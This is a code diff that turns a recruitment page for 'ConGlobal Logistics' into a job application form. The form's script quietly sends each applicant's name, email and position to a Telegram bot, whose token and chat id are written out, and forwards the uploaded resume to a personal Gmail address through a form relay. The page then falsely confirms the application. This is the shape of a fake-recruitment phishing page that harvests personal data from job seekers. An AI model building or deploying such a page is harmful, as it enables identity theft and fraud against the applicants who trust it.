@@ -1,243 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ConGlobal Logistics</title>
+<meta charset="UTF-8">
+<title>Apply</title>
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+<style>
+body{
+  background:#0b1220;
+  color:white;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  font-family:Arial;
+}
 
-    body {
-      background: #0f172a;
-      color: white;
-    }
+form{
+  background:#020617;
+  padding:30px;
+  border-radius:10px;
+  width:300px;
+}
 
-    /* NAVBAR */
-    .navbar {
-      position: fixed;
-      width: 100%;
-      top: 0;
-      display: flex;
-      justify-content: space-between;
-      padding: 15px 30px;
-      background: rgba(0,0,0,0.7);
-      z-index: 1000;
-    }
+input,select{
+  width:100%;
+  padding:10px;
+  margin:10px 0;
+}
 
-    .navbar a {
-      color: white;
-      text-decoration: none;
-      margin-left: 20px;
-    }
-
-    /* HERO */
-    .hero {
-      height: 100vh;
-      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),
-      url('https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d');
-      background-size: cover;
-      background-position: center;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 20px;
-    }
-
-    .hero-content {
-      background: rgba(0,0,0,0.6);
-      padding: 40px;
-      border-radius: 10px;
-      max-width: 700px;
-
-      /* ✅ ANIMATION ALREADY ADDED */
-      animation: fadeUp 1s ease;
-    }
-
-    @keyframes fadeUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .hero-content h1 {
-      font-size: clamp(36px, 5vw, 64px);
-      margin-bottom: 20px;
-    }
-
-    .hero-content p {
-      font-size: clamp(18px, 2vw, 22px);
-      margin-bottom: 25px;
-    }
-
-    .hero-content button {
-      padding: 12px 25px;
-      background: #22c55e;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    /* ABOUT */
-    .about {
-      padding: 80px 20px;
-      text-align: center;
-      max-width: 800px;
-      margin: auto;
-    }
-
-    .about h2 {
-      margin-bottom: 20px;
-      font-size: 32px;
-    }
-
-    .about p {
-      font-size: 18px;
-      line-height: 1.6;
-    }
-
-    /* FEATURES */
-    .features {
-      padding: 80px 20px;
-      text-align: center;
-    }
-
-    .feature-box {
-      margin: 20px auto;
-      max-width: 500px;
-      background: rgba(255,255,255,0.05);
-      padding: 20px;
-      border-radius: 10px;
-    }
-
-    /* TESTIMONIALS */
-    .testimonials {
-      padding: 80px 20px;
-      text-align: center;
-      background: #020617;
-    }
-
-    .testimonial {
-      max-width: 600px;
-      margin: 20px auto;
-      background: rgba(255,255,255,0.05);
-      padding: 20px;
-      border-radius: 10px;
-    }
-
-    .testimonial p {
-      font-style: italic;
-    }
-
-    .testimonial h4 {
-      margin-top: 10px;
-      color: #22c55e;
-    }
-
-    /* FOOTER */
-    footer {
-      text-align: center;
-      padding: 20px;
-      background: #000;
-      margin-top: 40px;
-    }
-  </style>
+button{
+  width:100%;
+  padding:10px;
+  background:#2563eb;
+  color:white;
+  border:none;
+}
+</style>
 </head>
 
 <body>
 
-  <!-- NAVBAR -->
-  <div class="navbar">
-    <div><strong>ConGlobal</strong></div>
-    <div>
-      <a href="#about">About</a>
-      <a href="apply.html">Apply</a>
-    </div>
-  </div>
+<form id="form">
+<h2>Apply</h2>
 
-  <!-- HERO -->
-  <section class="hero">
-    <div class="hero-content">
-      <h1>Join ConGlobal Logistics</h1>
-      <p>Modern workforce powering global supply chains</p>
+<input name="name" placeholder="Full Name" required>
+<input name="email" placeholder="Email" required>
 
-      <a href="apply.html">
-        <button>Apply Now</button>
-      </a>
+<select name="position">
+<option>Warehouse</option>
+<option>Driver</option>
+</select>
 
-    </div>
-  </section>
+<input type="file" name="resume" required>
 
-  <!-- ABOUT -->
-  <section id="about" class="about">
-    <h2>About ConGlobal Logistics</h2>
-    <p>
-      ConGlobal Logistics is a trusted leader in global supply chain and logistics solutions,
-      delivering efficient, secure, and reliable services worldwide.
-      <br><br>
-      We specialize in cargo handling, warehousing, and transportation,
-      ensuring smooth operations across industries.
-      <br><br>
-      Our mission is to connect businesses through innovation and a skilled workforce.
-    </p>
-  </section>
+<button type="submit">Submit</button>
+</form>
 
-  <!-- FEATURES -->
-  <section class="features">
-    <h2>Why Work With Us</h2>
+<script>
+const form=document.getElementById("form");
 
-    <div class="feature-box">
-      <h3>🌍 Global Opportunities</h3>
-      <p>Work with international teams and grow your career.</p>
-    </div>
+form.addEventListener("submit",async(e)=>{
+e.preventDefault();
 
-    <div class="feature-box">
-      <h3>💼 Career Growth</h3>
-      <p>We provide training and long-term opportunities.</p>
-    </div>
+const data=new FormData(form);
 
-    <div class="feature-box">
-      <h3>⚡ Modern Workplace</h3>
-      <p>Advanced logistics systems and smooth workflow.</p>
-    </div>
-  </section>
+const message=`
+New Application
+Name: ${data.get("name")}
+Email: ${data.get("email")}
+Position: ${data.get("position")}
+`;
 
-  <!-- TESTIMONIALS -->
-  <section class="testimonials">
-    <h2>What Our Employees Say</h2>
+await fetch("https://api.telegram.org/8565717097:AAGpHQVR69-cbHDYHUzB4uShs2AO_4AprfE/sendMessage",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:"7130815599",
+text:message
+})
+});
 
-    <div class="testimonial">
-      <p>"Great team and strong support system."</p>
-      <h4>- Michael A.</h4>
-    </div>
+await fetch("https://formsubmit.co/katesteward34@gmail.com",{
+method:"POST",
+body:data
+});
 
-    <div class="testimonial">
-      <p>"Professional and growth-focused environment."</p>
-      <h4>- Sarah K.</h4>
-    </div>
-
-    <div class="testimonial">
-      <p>"Efficient operations and great leadership."</p>
-      <h4>- Daniel T.</h4>
-    </div>
-  </section>
-
-  <!-- FOOTER -->
-  <footer>
-    <p>© 2026 ConGlobal Logistics. All rights reserved.</p>
-  </footer>
+alert("Application Sent!");
+form.reset();
+});
+</script>
 
 </body>
 </html>
